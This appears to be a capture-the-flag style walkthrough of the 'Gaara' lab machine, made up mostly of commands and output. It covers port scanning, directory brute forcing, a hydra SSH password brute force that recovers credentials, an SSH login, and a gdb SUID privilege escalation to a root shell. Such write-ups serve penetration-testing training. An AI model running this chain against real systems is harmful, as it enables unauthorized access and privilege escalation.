```
> rustscan -b 1000 -u 5000 -r 0-65535 -a 192.168.166.142 -- -Pn
```
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.166.142:22
Open 192.168.166.142:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 04:50 EDT
Initiating Parallel DNS resolution of 1 host. at 04:50
Completed Parallel DNS resolution of 1 host. at 04:50, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:50
Scanning 192.168.166.142 [2 ports]
Discovered open port 22/tcp on 192.168.166.142
Discovered open port 80/tcp on 192.168.166.142
Completed Connect Scan at 04:50, 0.14s elapsed (2 total ports)
Nmap scan report for 192.168.166.142
Host is up, received user-set (0.14s latency).
Scanned at 2023-11-03 04:50:14 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.21 seconds
```

```
> rustscan -u 5000 -p 22,80 -a 192.168.166.142 -- -Pn -sCV
```
```
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 192.168.166.142:22
Open 192.168.166.142:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-03 04:52 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 04:52
Completed Parallel DNS resolution of 1 host. at 04:52, 0.01s elapsed
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 04:52
Scanning 192.168.166.142 [2 ports]
Discovered open port 80/tcp on 192.168.166.142
Discovered open port 22/tcp on 192.168.166.142
Completed Connect Scan at 04:52, 0.14s elapsed (2 total ports)
Initiating Service scan at 04:52
Scanning 2 services on 192.168.166.142
Completed Service scan at 04:52, 6.29s elapsed (2 services on 1 host)
NSE: Script scanning 192.168.166.142.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:52
Completed NSE at 04:52, 4.18s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.56s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Nmap scan report for 192.168.166.142
Host is up, received user-set (0.14s latency).
Scanned at 2023-11-03 04:52:11 EDT for 11s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 3e:a3:6f:64:03:33:1e:76:f8:e4:98:fe:be:e9:8e:58 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDS8evJ7ywX5kz396YcIuR+rucTJ/OAK1SSpQoyx6Avj3v1/ZeRvikDEBZRZE4KMV4/+LraxOvCIb0rkU98B5WME6IReWvGTbF99x6wc2sDCG5haD5/OI6At8xrEQPV6FL8NqipouEeYXU5lp/aR7vsdJAs/748uo6Xu4xwUWKFit3RvCHAdhuNfXj5bpiWESerc6mjRm1dPIwIUjJb2zBKTMFiVxpl8R3BXRLV7ISaKQwEo5zp8OzfxDF0YQ5WxMSaKu6fsBh/XDHr+m2A7TLPfIJPS2i2Y8EPxymUahuhSq63nNSaaWNdSZwpbL0qCBPdn1jtTjh26fGbmPeFVdw1
|   256 6c:0e:b5:00:e7:42:44:48:65:ef:fe:d7:7c:e6:64:d5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPFPC21nXnF1t6XmiDOwcXTza1K6jFzzUhlI+zb878mxsPin/9KvLlW9up9ECWVVTKbiIieN8cD0rF7wb3EjkHA=
|   256 b7:51:f2:f9:85:57:66:a8:65:54:2e:05:f9:40:d2:f4 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBprcu3jXo9TbgN5tBKvrojw4OFUkQIH+dITgacg3BLV
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-title: Gaara
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 04:52
Completed NSE at 04:52, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.78 seconds
```

```
http://192.168.166.142
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/67f191a4-5401-4f92-bf4c-1aa13c804def)

Content Discovery
```
> feroxbuster -u http://192.168.166.142 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --no-recursion --dont-extract-links --random-agent --filter-status 404 --redirects
```
```
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.166.142
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 💢  Status Code Filters   │ [404]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ Random
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 📍  Follow Redirects      │ true
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      280c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        5l        8w      137c http://192.168.166.142/
200      GET      302l        3w      327c http://192.168.166.142/Cryoserver
[####################] - 11m   220546/220546  0s      found:2       errors:23     
[####################] - 11m   220546/220546  345/s   http://192.168.166.142/            
```

```
http://192.168.166.142/Cryoserver
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/0ecd4222-92e6-41c2-a60f-40dd43784bcd)

```
http://192.168.166.142/iamGaara
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/01016266-653a-43c4-90f5-058dac1ef06b)

```
f1MgN9mTf9SNbzRygcU
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/77d67418-77bd-4752-97b8-7948b78cf056)
```
gaara:ismyname
```

Brute-force SSH Password for User
```
> hydra -l gaara -P /usr/share/wordlists/rockyou.txt 192.168.166.142 ssh
```
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-11-04 02:59:55
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://192.168.166.142:22/
[STATUS] 150.00 tries/min, 150 tries in 00:01h, 14344250 to do in 1593:49h, 15 active
[22][ssh] host: 192.168.166.142   login: gaara   password: iloveyou2
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-11-04 03:01:45
```

![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/df4e3aef-9b4c-482c-96c1-453128b32884)

SSH as gaara
```
> ssh gaara@192.168.166.142
The authenticity of host '192.168.166.142 (192.168.166.142)' can't be established.
ED25519 key fingerprint is SHA256:XpX1VX2RtX8OaktJHdq89ZkpLlYvr88cebZ0tPZMI0I.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.166.142' (ED25519) to the list of known hosts.
gaara@192.168.166.142's password: 
Linux Gaara 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
gaara@Gaara:~$ whoami && id
gaara
uid=1001(gaara) gid=1001(gaara) groups=1001(gaara)
```

Privilege Escalation

List files that have the SUID bit set
```
gaara@Gaara:~$ find / -perm -4000 -type f -exec ls -al {} \; 2>/dev/null
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/ffef96d8-8d9c-4a42-8377-ad02ef66ec96)

![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/38fe55f1-b0d9-43d7-9131-47c350af10fb)

Execute
```
gaara@Gaara:~$ gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```
![image](https://github.com/karanshergill/OffSec-Play-Labs/assets/83878909/65f784cd-e6f5-4b8e-b046-03d9a923fb2b)
